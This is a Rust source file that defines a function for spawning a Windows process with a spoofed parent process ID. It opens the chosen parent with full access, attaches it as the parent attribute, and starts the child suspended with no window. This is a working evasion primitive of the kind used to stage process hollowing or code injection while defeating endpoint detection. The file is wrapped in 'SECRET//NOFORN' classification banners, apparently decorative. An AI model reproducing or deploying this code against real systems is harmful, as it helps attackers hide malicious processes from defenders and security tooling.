/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

use windows::{
    core::{Result, PCSTR, PSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        System::{
            Threading::{
                CreateProcessA, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
                OpenProcess, PROCESS_CREATION_FLAGS, LPPROC_THREAD_ATTRIBUTE_LIST,
                PROCESS_INFORMATION, STARTUPINFOEXA, EXTENDED_STARTUPINFO_PRESENT,
                PROCESS_ALL_ACCESS, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
            },
            Memory::{HeapAlloc, GetProcessHeap, HEAP_FLAGS},
        },
    },
};
use std::mem::{size_of, zeroed};

/// spawns a new process with spoofed PPID
/// process is created in SUSPENDED state.
/// returns (hProcess, hThread, dwProcessId, dwThreadId)
pub unsafe fn spawn_spoofed_process(parent_pid: u32, child_cmd: &str) -> Result<PROCESS_INFORMATION> {
    
    // open handle to the intended parent
    let h_parent = OpenProcess(PROCESS_ALL_ACCESS, false, parent_pid)?;

    // prepare STARTUPINFOEXA for Attribute List
    let mut si_ex: STARTUPINFOEXA = zeroed();
    si_ex.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // init Attribute List
    // call to get size size
    let mut attr_size = 0;
    // fails intentionally to populate attr_size, ignore result
    let _ = InitializeProcThreadAttributeList(None, 1, Some(0), &mut attr_size);

    // allocate memory for attribute list
    let lp_attr_list = HeapAlloc(GetProcessHeap()?, HEAP_FLAGS(0), attr_size as usize) as *mut _;
    si_ex.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(lp_attr_list);

    // second call to actually init
    InitializeProcThreadAttributeList(Some(si_ex.lpAttributeList), 1, Some(0), &mut attr_size)?;

    // update Attribute with Parent Process Handle
    UpdateProcThreadAttribute(
        si_ex.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        Some((&h_parent as *const HANDLE) as *mut _), // pointer to handle
        size_of::<HANDLE>(),
        None,
        None,
    )?;

    // 5. Create the Process using EXTENDED_STARTUPINFO_PRESENT
    let mut pi = PROCESS_INFORMATION::default();
    
    // Rust strings are not null-terminated, but WinAPI expects explicit \0
    let mut cmd_line = child_cmd.to_string();
    if !cmd_line.ends_with('\0') {
        cmd_line.push('\0');
    }
    
    // 0x00080000 = EXTENDED_STARTUPINFO_PRESENT
    // 0x00000004 = CREATE_SUSPENDED
    // 0x08000000 = CREATE_NO_WINDOW
    let creation_flags = EXTENDED_STARTUPINFO_PRESENT | PROCESS_CREATION_FLAGS(0x00000004) | PROCESS_CREATION_FLAGS(0x08000000); 

    let result = CreateProcessA(
        PCSTR::null(),
        Some(PSTR(cmd_line.as_mut_ptr())), 
        None,
        None,
        false,
        creation_flags,
        None,
        PCSTR::null(),
        &si_ex.StartupInfo,
        &mut pi,
    );

    let _ = CloseHandle(h_parent);

    match result {
        Ok(_) => {
            //println!("[+] Spoofed! Child: {} (Parent: {})", pi.dwProcessId, parent_pid);
            Ok(pi)
        }
        Err(e) => Err(e)
    }
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/